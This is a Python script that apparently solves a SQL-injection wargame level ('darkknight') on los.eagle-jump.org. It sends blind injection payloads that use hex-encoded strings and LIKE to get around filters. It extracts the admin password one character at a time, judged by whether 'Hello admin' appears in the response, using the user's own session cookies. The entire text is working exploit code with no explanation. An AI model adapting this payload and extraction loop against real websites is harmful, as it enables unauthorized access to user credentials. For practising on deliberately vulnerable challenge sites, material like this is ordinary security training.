import urllib.parse
import http.client

HTTP=http.client.HTTPConnection("los.eagle-jump.org")
Url="/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="
Headers={"Cookie":"__cfduid=[your Own cfduid]; PHPSESSID=[your Own PHPSESSID]"} #check your own cookie then insert the correct value to make connection success, or you will get nothing return.
Passwd=""

pwNotInChar = False
for i in range(len(Passwd)+1,100):
    for c in "0123456789abcdefghijklmnopqrstuvwxyz+":

        Payload="1 || id like 0x61646D696E && mid(pw,"+str(i)+",1) like "+str(hex(ord(c)))

        HTTP.request("GET",Url+urllib.parse.quote(Payload),"",Headers)

        print (Payload)
                
        if (b"Hello admin" in HTTP.getresponse().read()):
            Passwd+=c
            print ("[+] Found: %c" % c)

            HTTP.request("GET",Url+urllib.parse.quote(Passwd),"",Headers)
            if (b"Clear" in HTTP.getresponse().read()):
                print ("[*] Password: %s" % Passwd)

            break
        if (str(c) == "+"):
            pwNotInChar = True
            break
    if(pwNotInChar == True):
        break
    
print ("[!] Not Found")
print ("[*] Password: %s" % Passwd)